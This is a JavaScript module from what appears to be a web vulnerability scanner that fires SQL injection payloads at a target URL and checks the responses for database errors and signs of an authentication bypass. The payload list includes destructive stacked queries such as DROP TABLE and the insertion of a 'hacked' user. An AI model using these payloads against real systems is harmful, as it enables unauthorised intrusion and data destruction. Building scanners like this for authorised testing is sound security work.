import httpClient from '../../utils/http-client.js';
import logger from '../../utils/logger.js';

/**
 * SQL Injection Attack Module
 * ───────────────────────────
 * Sends a battery of classic SQL injection payloads to the target and
 * inspects responses for indicators that the input was interpreted as SQL.
 *
 * Detection signals:
 *  - Database error strings in the response body
 *  - Different status codes / body lengths vs. the baseline
 *  - Successful authentication bypass patterns
 */

const SQL_PAYLOADS = [
  // Classic tautology
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "' OR 1=1 --",
  '" OR "1"="1',

  // Union-based probing
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT 1,2,3--",

  // Error-based
  "' AND 1=CONVERT(int,(SELECT @@version))--",
  "'; DROP TABLE users;--",
  "1' ORDER BY 1--",
  "1' ORDER BY 100--",

  // Time-based blind
  "'; WAITFOR DELAY '0:0:5'--",
  "' OR SLEEP(3)--",

  // Stacked queries
  "'; INSERT INTO users VALUES('hacked','hacked');--",
];

const ERROR_SIGNATURES = [
  'sql syntax',
  'mysql_fetch',
  'unclosed quotation',
  'microsoft ole db',
  'odbc drivers',
  'syntax error',
  'pg_query',
  'sqlite3',
  'ora-00933',
  'quoted string not properly terminated',
  'you have an error in your sql',
  'warning: mysql',
  'PostgreSQL',
  'SQLite/JDBCDriver',
  'com.mysql.jdbc',
  'org.postgresql',
  'microsoft sql native client error',
];

/**
 * Run the SQL injection test suite against a target URL.
 * @param {string} targetUrl - The URL to test
 * @param {object} [options] - Additional options
 * @returns {Promise<object>} - Test results
 */
export async function runSqlInjection(targetUrl, options = {}) {
  logger.info(`[SQLi] Starting SQL injection tests on ${targetUrl}`);

  const results = {
    attackType: 'sql-injection',
    targetUrl,
    totalPayloads: SQL_PAYLOADS.length,
    findings: [],
    vulnerable: false,
    severity: 'NONE',
    startTime: Date.now(),
    endTime: null,
  };

  // ── 1. Establish baseline ──────────────────────────────────────────
  let baseline;
  try {
    baseline = await httpClient.get(targetUrl);
  } catch {
    baseline = { status: 0, data: '', headers: {} };
  }
  const baselineBodyLen = JSON.stringify(baseline.data || '').length;

  // ── 2. Fire each payload ───────────────────────────────────────────
  for (const payload of SQL_PAYLOADS) {
    try {
      // Try payload in query string
      const urlWithPayload = new URL(targetUrl);
      // Append payload to every existing query param, or add as 'q'
      if ([...urlWithPayload.searchParams].length === 0) {
        urlWithPayload.searchParams.set('q', payload);
      } else {
        for (const [key] of urlWithPayload.searchParams) {
          urlWithPayload.searchParams.set(key, payload);
        }
      }

      const getRes = await httpClient.get(urlWithPayload.toString());

      // Also try as POST body
      const postRes = await httpClient.post(targetUrl, {
        username: payload,
        password: payload,
        email: payload,
        search: payload,
        query: payload,
        id: payload,
      });

      // ── Analyze responses ────────────────────────────────────────
      for (const [method, res] of [['GET', getRes], ['POST', postRes]]) {
        const body = JSON.stringify(res.data || '').toLowerCase();
        const bodyLen = body.length;
        const indicators = [];

        // Check for DB error messages
        for (const sig of ERROR_SIGNATURES) {
          if (body.includes(sig.toLowerCase())) {
            indicators.push(`Database error signature detected: "${sig}"`);
          }
        }

        // Check for status code differences
        if (baseline.status !== res.status && res.status === 200) {
          indicators.push(
            `Status changed from ${baseline.status} to ${res.status} (possible bypass)`,
          );
        }

        // Check for significantly different response size (data leakage)
        if (bodyLen > baselineBodyLen * 2 && bodyLen > 200) {
          indicators.push(
            `Response body significantly larger (${bodyLen} vs baseline ${baselineBodyLen})`,
          );
        }

        // Check if response contains typical SQL data patterns
        if (body.includes('password') && !JSON.stringify(baseline.data || '').toLowerCase().includes('password')) {
          indicators.push('Response contains "password" field not present in baseline');
        }

        if (indicators.length > 0) {
          results.findings.push({
            payload,
            method,
            url: method === 'GET' ? urlWithPayload.toString() : targetUrl,
            statusCode: res.status,
            responseTime: res.duration || 0,
            bodyLength: bodyLen,
            indicators,
            responseSnippet: JSON.stringify(res.data).substring(0, 500),
          });
        }
      }
    } catch (err) {
      logger.warn(`[SQLi] Payload failed: ${payload} — ${err.message}`);
    }
  }

  // ── 3. Determine severity ──────────────────────────────────────────
  results.vulnerable = results.findings.length > 0;
  if (results.findings.length >= 5) {
    results.severity = 'HIGH';
  } else if (results.findings.length >= 2) {
    results.severity = 'MEDIUM';
  } else if (results.findings.length >= 1) {
    results.severity = 'LOW';
  }

  results.endTime = Date.now();
  results.durationMs = results.endTime - results.startTime;
  logger.info(`[SQLi] Completed — ${results.findings.length} finding(s), severity: ${results.severity}`);

  return results;
}
